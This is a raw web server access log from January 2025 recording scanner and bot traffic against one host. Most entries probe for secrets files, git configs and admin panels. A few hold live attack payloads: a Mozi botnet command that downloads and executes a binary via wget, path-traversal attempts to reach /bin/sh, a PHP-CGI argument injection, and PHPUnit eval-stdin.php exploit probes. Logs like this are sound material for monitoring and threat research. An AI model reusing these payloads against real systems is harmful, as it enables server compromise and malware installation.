146.19.24.18 - - [19/Jan/2025:00:04:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
86.158.26.38 - - [19/Jan/2025:00:40:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
61.65.59.95 - - [19/Jan/2025:00:45:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
165.22.94.77 - - [19/Jan/2025:00:58:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
165.22.94.77 - - [19/Jan/2025:00:58:11 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.22.94.77 - - [19/Jan/2025:00:58:11 +0000] "GET /odinhttpcall1737248291 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.22.94.77 - - [19/Jan/2025:00:58:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
165.22.94.77 - - [19/Jan/2025:00:58:12 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.22.94.77 - - [19/Jan/2025:00:58:12 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.22.94.77 - - [19/Jan/2025:00:58:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
165.22.94.77 - - [19/Jan/2025:00:58:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.99.130.2 - - [19/Jan/2025:00:58:13 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
134.209.241.247 - - [19/Jan/2025:00:58:13 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.130.2 - - [19/Jan/2025:00:58:13 +0000] "GET /v2/_catalog HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.133.141 - - [19/Jan/2025:00:58:13 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.250.59 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
167.99.133.141 - - [19/Jan/2025:00:58:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
134.209.241.247 - - [19/Jan/2025:00:58:13 +0000] "\x16\x03\x01\x01$\x01" 400 524 "-" "-"
134.209.241.247 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
167.99.130.2 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
167.99.130.2 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/v2/_catalog" "Go-http-client/1.1"
167.99.133.141 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/solr/admin/info/system" "Go-http-client/1.1"
167.99.133.141 - - [19/Jan/2025:00:58:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
143.198.204.165 - - [19/Jan/2025:00:58:13 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.133.141 - - [19/Jan/2025:00:58:13 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
143.198.204.165 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/favicon.ico" "Go-http-client/1.1"
167.99.133.141 - - [19/Jan/2025:00:58:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
195.3.223.40 - - [19/Jan/2025:00:58:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [19/Jan/2025:00:58:20 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
167.172.90.143 - - [19/Jan/2025:01:35:59 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [19/Jan/2025:01:36:09 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
193.142.146.175 - - [19/Jan/2025:01:40:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:01:40:33 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
167.172.72.201 - - [19/Jan/2025:01:44:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [19/Jan/2025:01:44:13 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
179.43.191.146 - - [19/Jan/2025:01:48:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.104 - - [19/Jan/2025:01:48:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
167.172.72.201 - - [19/Jan/2025:01:48:52 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [19/Jan/2025:01:49:05 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.72.201 - - [19/Jan/2025:01:49:32 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [19/Jan/2025:01:49:45 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
205.210.31.13 - - [19/Jan/2025:01:52:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.18 - - [19/Jan/2025:02:21:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [19/Jan/2025:02:26:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [19/Jan/2025:02:26:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:02:26:38 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
153.204.37.137 - - [19/Jan/2025:02:49:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
153.204.37.137 - - [19/Jan/2025:02:49:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
162.216.149.24 - - [19/Jan/2025:02:59:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.93 - - [19/Jan/2025:03:15:16 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:03:15:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.164.177.72 - - [19/Jan/2025:03:24:02 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 524 "-" "-"
185.16.39.104 - - [19/Jan/2025:03:30:59 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [19/Jan/2025:03:46:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.185 - - [19/Jan/2025:03:52:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
209.38.81.233 - - [19/Jan/2025:03:54:07 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [19/Jan/2025:03:59:25 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0"
78.153.140.177 - - [19/Jan/2025:03:59:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.177 - - [19/Jan/2025:03:59:25 +0000] "GET /.ENV HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Build/NCQ26.69-46) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36"
198.235.24.255 - - [19/Jan/2025:04:15:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.142.146.175 - - [19/Jan/2025:04:18:37 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:04:18:38 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.93 - - [19/Jan/2025:04:32:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:04:32:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.10 - - [19/Jan/2025:04:38:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
64.62.197.16 - - [19/Jan/2025:05:08:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.197.11 - - [19/Jan/2025:05:10:42 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
64.62.197.11 - - [19/Jan/2025:05:11:18 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
206.168.34.219 - - [19/Jan/2025:05:12:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.219 - - [19/Jan/2025:05:12:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.219 - - [19/Jan/2025:05:12:46 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.219 - - [19/Jan/2025:05:12:49 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.219 - - [19/Jan/2025:05:12:52 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
146.19.24.18 - - [19/Jan/2025:05:17:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [19/Jan/2025:05:17:22 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.76.203.56 - - [19/Jan/2025:05:33:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
78.153.140.93 - - [19/Jan/2025:05:55:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:05:55:19 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [19/Jan/2025:05:57:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [19/Jan/2025:06:01:28 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [19/Jan/2025:06:01:30 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
146.19.24.168 - - [19/Jan/2025:06:08:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [19/Jan/2025:06:23:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
46.19.138.234 - - [19/Jan/2025:06:26:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [19/Jan/2025:06:39:46 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
193.142.146.175 - - [19/Jan/2025:06:48:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:06:48:12 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
15.235.224.238 - - [19/Jan/2025:07:18:30 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
178.215.236.132 - - [19/Jan/2025:07:48:03 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18"
146.19.24.18 - - [19/Jan/2025:07:48:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.168 - - [19/Jan/2025:07:55:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
18.219.145.4 - - [19/Jan/2025:08:02:09 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.219.145.4 - - [19/Jan/2025:08:02:51 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
87.120.115.119 - - [19/Jan/2025:08:12:49 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.110 Safari/537.36 Vivaldi/2.7.1628.28"
78.153.140.93 - - [19/Jan/2025:08:18:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:08:18:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.236.176.112 - - [19/Jan/2025:08:20:15 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
193.142.146.175 - - [19/Jan/2025:08:21:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [19/Jan/2025:08:21:36 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
198.235.24.161 - - [19/Jan/2025:08:36:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
198.235.24.161 - - [19/Jan/2025:08:36:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
5.181.190.248 - - [19/Jan/2025:08:37:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.40 - - [19/Jan/2025:08:44:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.43 - - [19/Jan/2025:08:59:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.142 - - [19/Jan/2025:09:12:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
104.152.52.114 - - [19/Jan/2025:09:21:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
167.172.90.143 - - [19/Jan/2025:09:27:27 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [19/Jan/2025:09:27:35 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [19/Jan/2025:09:35:32 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [19/Jan/2025:09:35:42 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
78.153.140.93 - - [19/Jan/2025:09:39:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:09:39:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.189.152.11 - - [19/Jan/2025:09:40:06 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [19/Jan/2025:09:40:18 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
206.189.152.11 - - [19/Jan/2025:09:40:40 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [19/Jan/2025:09:40:51 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
185.16.39.104 - - [19/Jan/2025:10:02:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.138.36 - - [19/Jan/2025:10:13:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.138.36 - - [19/Jan/2025:10:14:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.36 - - [19/Jan/2025:10:14:06 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.36 - - [19/Jan/2025:10:14:11 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.36 - - [19/Jan/2025:10:14:14 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
80.82.77.202 - - [19/Jan/2025:10:20:50 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Maxthon 2.0)"
78.153.140.93 - - [19/Jan/2025:11:01:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [19/Jan/2025:11:01:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [19/Jan/2025:11:16:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
47.251.15.21 - - [19/Jan/2025:11:36:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
47.88.87.97 - - [19/Jan/2025:11:36:44 +0000] "GET /Public/home/js/check.js HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
47.88.87.97 - - [19/Jan/2025:11:36:45 +0000] "GET / HTTP/1.1" 200 1002 "http://34.93.54.196/Public/home/js/check.js" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
47.88.94.161 - - [19/Jan/2025:11:36:45 +0000] "GET /static/admin/javascript/hetong.js HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
47.88.78.6 - - [19/Jan/2025:11:36:46 +0000] "GET / HTTP/1.1" 200 1003 "http://34.93.54.196/static/admin/javascript/hetong.js" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
172.105.128.11 - - [19/Jan/2025:11:49:52 +0000] "\x16\x03\x01" 400 524 "-" "-"
139.59.101.104 - - [19/Jan/2025:12:22:34 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
146.19.24.168 - - [19/Jan/2025:12:25:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [19/Jan/2025:12:39:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
141.94.145.70 - - [19/Jan/2025:12:42:16 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1"
60.13.146.4 - - [18/Jan/2025:00:19:52 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:53 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:54 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:54 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:54 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:55 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:55 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:55 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:56 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:56 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:56 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:57 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:57 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:57 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:58 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:58 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:58 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:59 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:59 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:19:59 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:00 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:00 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:00 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
